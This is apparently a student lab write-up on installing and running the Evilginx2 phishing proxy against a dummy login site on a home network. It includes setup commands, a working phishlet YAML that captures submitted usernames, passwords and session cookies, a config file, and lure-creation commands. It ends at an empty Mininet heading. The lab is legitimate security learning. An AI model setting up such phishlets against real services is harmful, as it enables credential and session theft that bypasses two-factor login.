# Lab and simulation environments in attacks

# A) Tools
Familiarize yourself with the tool: **Evilginx** <https://github.com/kgretzky/evilginx2>     
Answer the following questions:
- Did you install the tool, and how did you do it?
- What did you do with the tool?
- Were you succesfull in spoofing traffic?

### Walkthrough
Install using:
```
$ sudo apt install evilginx2
```
- <img width="790" height="339" alt="Screenshot from 2025-11-23 22-54-42" src="https://github.com/user-attachments/assets/fd806af2-a535-4322-a8e5-c0b70777d464" />     

Launch by typing:
```
$ evilginx2
```
- <img width="994" height="612" alt="Screenshot from 2025-11-24 10-06-50" src="https://github.com/user-attachments/assets/ff14f7b3-09a2-4c9e-a96b-4fce0c6d1c90" />     
 
Set up domain and IP (i'm trying this out in my local network)
```
: config domain <your-domain>
```
```
: config ipv4 external <the-ip-of-the-proxy>
```
 - <img width="905" height="146" alt="Screenshot from 2025-11-24 10-25-51" src="https://github.com/user-attachments/assets/da088d8e-538b-44b7-9d0d-2050c77c433a" />

Because i'm doing this in my own LAN, a simple config of `/etc/hosts` on the "victim" will do the trick.     
Set up a IP => to domain mapping.     
**First get the IP:** 
- <img width="232" height="70" alt="Screenshot from 2025-11-24 18-31-18" src="https://github.com/user-attachments/assets/f3ae9a99-ec8d-4952-8a59-a985049767cf" />     

**Then map it on your host machine:** 
- <img width="480" height="246" alt="Screenshot from 2025-11-24 18-32-38" src="https://github.com/user-attachments/assets/aa2d44ab-002a-43d9-afa8-7d951aab4d16" />

On my "attack machine", in the `~/.evilginx/crt/`, I ran a command to create snakeoil certs:
```
$ openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout login.safe-domain.com.key -out login.safe-domain.com.crt -subj "/CN=login.safe-domain.com" -addext "subjectAltName=DNS:login.safe-domain.com"
```
I asked chatGPT to make me a dummy login site which I can use for in my own LAN. I had it create me a python flask app I can use for testing purposes.
The dummy site works:
- <img width="1226" height="421" alt="Screenshot from 2025-11-24 18-48-13" src="https://github.com/user-attachments/assets/091aa1d0-f20f-439a-94ab-5a92651047a5" />

```bash
$ cat /usr/share/evilginx2/phishlets/dummy.yaml
```
Output:
```yaml
name: 'dummy'
author: 'aliG'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'safe-domain.com', proto: 'http', orig_host: '192.168.1.123:8080',  session: true, is_landing: true, auto_filter: true}

sub_filters:
  - {triggers_on: 'safe-domain.com', orig_sub: 'login', domain: 'safe-domain.com', mimes: ['text/html', 'application/json', 'text/plain'], search: 'safe-domain.com', replace: 'login.safe-domain.com'}

auth_tokens:
  - name: 'sessionid'
    domain: 'login.safe-domain.com'
    path: '/'
    keys: ['sessionid']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.safe-domain.com'
  path: '/login'

landing:
  domain: 'login.safe-domain.com'
  path: '/dashboard'
```

File: `~/.evilginx/config.json`
```json
{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "autocert": false,
    "bind_ipv4": "",
    "dns_port": 53,
    "domain": "safe-domain.com",
    "external_ipv4": "192.168.1.123",
    "https_port": 443,
    "ipv4": "",
    "tls": {
      "cert_path": "/home/master/.evilginx/crt/login.safe-domain.com.crt",
      "key_path": "/home/master/.evilginx/crt/login.safe-domain.com.key",
      "use_letsencrypt": false
    },
    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  },
  "gophish": {
    "admin_url": "",
    "api_key": "",
    "insecure": false
  },
  "lures": [
    {
      "id": "",
      "hostname": "",
      "path": "/FfAubkCP",
      "redirect_url": "",
      "phishlet": "dummy",
      "redirector": "",
      "ua_filter": "",
      "info": "",
      "og_title": "",
      "og_desc": "",
      "og_image": "",
      "og_url": "",
      "paused": 0
    }
  ],
  "phishlets": {
    "dummy": {
      "hostname": "safe-domain.com",
      "unauth_url": "",
      "enabled": true,
      "visible": true
    },
    "example": {
      "hostname": "",
      "unauth_url": "",
      "enabled": false,
      "visible": true
    }
  }
}              
```

### Dummy site



Executing
```
: phishlets enable dummy
: lures create dummy
: lures get-url <x>
```  



Sources:

- <https://www.kali.org/tools/evilginx2/>
- <https://cilynx.com/how-to/evilginx2-vs-2fa-phishing/1908/>
   



# B) Mininet
